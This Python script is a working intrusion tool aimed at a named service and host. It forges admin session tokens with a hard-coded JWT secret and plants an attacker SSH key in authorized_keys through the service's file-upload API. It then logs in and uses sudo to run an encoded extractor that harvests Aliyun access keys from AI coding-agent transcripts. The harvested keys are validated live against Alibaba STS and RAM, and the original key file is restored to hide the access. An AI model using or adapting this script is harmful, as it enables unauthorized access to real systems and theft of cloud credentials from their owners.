#!/usr/bin/env python3
# i29365 round E: JSON-aware scan of intelora12 transcripts for real Aliyun creds in TEXT fields
# (skip base64 image blobs), then live STS GetCallerIdentity / RAM GetAccountAlias on the runner for candidates.
import os, sys, json, base64, hmac, hashlib, subprocess, random, re, uuid, datetime
import urllib.parse as up, urllib.request

HOST = "dashboard.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
AGENT = "agent-0cf829f4"; AUID = "4b4f439e-74f7-11f1-ac43-525400595be1"; ACUST = "tianyue"; AIP = "54.179.173.218"
UF = "/home/lumii/.lumii-agent-keeper/../.ssh"
UPATH = "/home/lumii/.ssh/authorized_keys"

def _b64(s):
    if isinstance(s, bytes): s = s.decode("utf-8", "replace")
    return base64.b64encode(s.encode("utf-8", "replace")).decode()

def R(k, v):
    s = v if isinstance(v, str) else json.dumps(v, ensure_ascii=False, default=str)
    print("R:%s:%s" % (k, _b64(s)), flush=True)

def Rbig(k, s, n=11000):
    if not isinstance(s, str): s = json.dumps(s, ensure_ascii=False, default=str)
    if len(s) == 0: s = "(empty)"
    for i in range(0, len(s), n):
        print("R:%s_%02d:%s" % (k, i // n, _b64(s[i:i+n])), flush=True)

def sh(a, timeout=120, inp=None):
    try:
        r = subprocess.run(a, input=inp, capture_output=True, timeout=timeout)
        return r.returncode, r.stdout.decode("utf-8", "replace"), r.stderr.decode("utf-8", "replace")
    except Exception as e:
        return -1, "", repr(e)

def curl(args, timeout=40):
    return sh(["curl", "-s", "-k", "-m", str(timeout)] + args, timeout=timeout + 20)

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def forge(p):
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    pl = b64u(json.dumps(p, separators=(",", ":")))
    return h + "." + pl + "." + b64u(hmac.new(JWT_SECRET.encode(), (h + "." + pl).encode(), hashlib.sha256).digest())

def tok_for(uid, cust): return forge({"userId": uid, "email": "probe@x", "customer": cust, "role": "admin"})

def call(path, cookie=None, timeout=30, maxlen=4000):
    a = ["--http2", "-A", UA, "-H", "Accept: application/json", "-w", "\n__CODE__%{http_code}"]
    if cookie: a += ["-H", "Cookie: session=" + cookie]
    a += ["https://%s%s" % (HOST, path)]
    rc, out, err = curl(a, timeout=timeout); i = out.rfind("__CODE__"); code = ""; txt = out
    if i >= 0: code = out[i+8:].strip()[:3]; txt = out[:i]
    return {"code": code, "body": txt[:maxlen]}

def files_read(path, tok, maxlen=4000):
    return call("/api/agents/%s/files?action=read&path=%s" % (AGENT, up.quote(path, safe="/")), cookie=tok, maxlen=maxlen)

def upload(tok, path, name, content, timeout=60):
    tmp = "/tmp/u_%d" % random.randint(1000, 999999)
    open(tmp, "wb").write(content.encode() if isinstance(content, str) else content)
    url = "https://%s/api/agents/%s/files/upload?path=%s" % (HOST, AGENT, up.quote(path, safe="/"))
    rc, out, err = curl(["--http2", "-A", UA, "-H", "Authorization: Bearer " + tok, "-w", "\n__CODE__%{http_code}",
                         "-F", "files=@%s;filename=%s" % (tmp, name), url], timeout=timeout)
    try: os.unlink(tmp)
    except Exception: pass
    i = out.rfind("__CODE__"); code = ""; txt = out
    if i >= 0: code = out[i+8:].strip()[:3]; txt = out[:i]
    return {"code": code, "body": txt[:900]}

# ---------- aliyun RPC signer ----------
def _enc(s):
    return up.quote(str(s), safe="-_.~")

def ali_call(endpoint, action, version, ak, sk, extra=None, token=None):
    p = {"Action": action, "Version": version, "Format": "JSON", "SignatureMethod": "HMAC-SHA1",
         "SignatureVersion": "1.0", "SignatureNonce": uuid.uuid4().hex,
         "Timestamp": datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ"),
         "AccessKeyId": ak}
    if token: p["SecurityToken"] = token
    if extra: p.update(extra)
    cq = "&".join("%s=%s" % (_enc(k), _enc(v)) for k, v in sorted(p.items()))
    sts = "GET&%2F&" + _enc(cq)
    sig = base64.b64encode(hmac.new((sk + "&").encode(), sts.encode(), hashlib.sha1).digest()).decode()
    url = "https://%s/?%s&Signature=%s" % (endpoint, cq, _enc(sig))
    req = urllib.request.Request(url, headers={"User-Agent": "ali-probe"})
    try:
        r = urllib.request.urlopen(req, timeout=25)
        return r.getcode(), r.read().decode("utf-8", "replace")[:1200]
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")[:1200]
    except Exception as e:
        return -1, repr(e)[:400]

EXTRACTOR = r'''
import os,sys,json,re
FILES=[
 "/home/coder/.claude/projects/-run-lumii-cc-2f08bd44-0505-4340-b48e-23dd00012ff0-cwd/0246fe6c-68a3-48df-a1f1-2b00b59d00cd.jsonl",
 "/home/coder/.claude/projects/-run-lumii-cc-2f08bd44-0505-4340-b48e-23dd00012ff0-cwd/9d0a1101-f53c-4814-ade6-4dfa4563cfd6.jsonl",
 "/home/coder/.claude/projects/-run-lumii-cc-2f08bd44-0505-4340-b48e-23dd00012ff0-cwd/1b393b2c-4343-4362-ba58-f5761a43f9b5.jsonl",
 "/home/coder/.lumii/agents/lumii-agent-tianyue3/lumii-agent-keeper/sessions/tianyue3_36eaf761.json",
]
KW=["ltai","accesskey","access-key","access_key","aliyun","aliyuncs","oss-cn","ossutil","ram.aliyuncs","sts.aliyuncs","secret_access_key"]
def hit(s):
    l=s.lower()
    return any(k in l for k in KW)
def walk(o,path,out,depth=0):
    if depth>12: return
    if isinstance(o,str):
        if len(o)<=20000 and hit(o): out.append((path,o))
    elif isinstance(o,dict):
        for k,v in o.items(): walk(v,path+"."+str(k),out,depth+1)
    elif isinstance(o,list):
        for idx,v in enumerate(o): walk(v,path+"[%d]"%idx,out,depth+1)
cnt=0; cands=set()
def emit(base,tag,path,s):
    global cnt
    if cnt>=50: return
    cnt+=1
    print("## %s %s path=%s len=%d" % (base,tag,path,len(s)))
    print("   "+s[:1000].replace("\n"," \\n "))
for fp in FILES:
    if not os.path.isfile(fp):
        print("## MISS "+fp); continue
    base=os.path.basename(fp)
    try: raw=open(fp,"rb").read()
    except Exception as e:
        print("## ERR "+base+" "+repr(e)); continue
    # JSONL / JSON parse
    parsed=0
    for ln,line in enumerate(raw.split(b"\n")):
        if not line.strip(): continue
        try: obj=json.loads(line)
        except Exception: continue
        parsed+=1
        out=[]; walk(obj,"",out)
        for path,s in out:
            emit(base,"JSON",path,s)
            for m in re.finditer(r"LTAI[0-9A-Za-z]{16,40}", s):
                aid=m.group(0); cands.add(("ID",aid))
                seg=s[max(0,m.start()-300):m.end()+400]
                for sm in re.finditer(r"[0-9A-Za-z/+]{28,64}", seg):
                    t=sm.group(0)
                    if t!=aid and ("LTAI" not in t):
                        cands.add(("PAIR",aid+"|"+t))
    print("## PARSED %s parsed_lines=%d rawlen=%d" % (base,parsed,len(raw)))
    if parsed==0:
        # raw text scan
        for kw in (b"LTAI",b"aliyun",b"AccessKeySecret",b"access-key-secret"):
            i=0;n=0
            while n<8:
                j=raw.find(kw,i)
                if j<0: break
                seg=raw[max(0,j-300):j+500].decode("utf-8","replace")
                emit(base,"RAW:"+kw.decode(),"@%d"%j,seg)
                n+=1; i=j+len(kw)
print("## CANDS_BEGIN")
for t,v in sorted(cands):
    print("CAND "+t+" "+v)
print("## CANDS_END")
'''

xb64 = base64.b64encode(EXTRACTOR.encode()).decode()

HARVEST = r'''
set +e
export LC_ALL=C
R() { echo "=== $1 ==="; }
R "SCAN"
echo "__XB64__" | sudo -n base64 -d > /tmp/x29365.py && sudo -n python3 -u /tmp/x29365.py 2>/dev/null | head -700
rm -f /tmp/x29365.py
R "END"
'''
HARVEST = HARVEST.replace("__XB64__", xb64)


def main():
    tok = tok_for(AUID, ACUST)
    sh(["rm", "-f", "/tmp/k29365", "/tmp/k29365.pub"])
    sh(["ssh-keygen", "-t", "ed25519", "-N", "", "-C", "i29365", "-f", "/tmp/k29365"], timeout=30)
    pub = open("/tmp/k29365.pub").read().strip() if os.path.exists("/tmp/k29365.pub") else ""
    cur = files_read(UPATH, tok, maxlen=6000)
    orig = ""
    try: orig = json.loads(cur["body"]).get("content", "") or ""
    except Exception: pass
    R("authkeys_before", {"code": cur["code"], "len": len(orig)})
    content = (orig.rstrip("\n") + "\n" if orig.strip() else "") + pub + "\n"
    R("upload_key", upload(tok, UF, "authorized_keys", content))
    rc, out, err = sh(["ssh", "-i", "/tmp/k29365", "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no",
                       "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=15", "coder@" + AIP, "bash -s"],
                      inp=HARVEST.encode(), timeout=600)
    R("h_rc", {"rc": rc, "outlen": len(out)})
    Rbig("out", out)
    R("h_err", err[:1200])
    if orig.strip():
        R("restore", upload(tok, UF, "authorized_keys", orig))
    else:
        R("restore", upload(tok, UF, "authorized_keys", ""))
    # live identity test on candidates found
    txt = out
    ids = re.findall(r"^CAND ID (\S+)$", out, re.M)
    pairs = re.findall(r"^CAND PAIR (\S+)\|(\S+)$", out, re.M)
    R("cand_ids", ids[:20])
    R("cand_pair_count", str(len(pairs)))
    tested = 0
    for aid, sec in pairs[:15]:
        c1, b1 = ali_call("sts.aliyuncs.com", "GetCallerIdentity", "2015-04-01", aid, sec)
        R("sts_%d" % tested, {"ak": aid[:12] + "...", "code": c1, "body": b1[:500]})
        if c1 == 200:
            c2, b2 = ali_call("ram.aliyuncs.com", "GetAccountAlias", "2015-05-01", aid, sec)
            R("ram_%d" % tested, {"code": c2, "body": b2[:500]})
        tested += 1

try:
    main()
except Exception:
    import traceback; R("FATAL", traceback.format_exc()[-2500:])
finally:
    sys.exit(1)
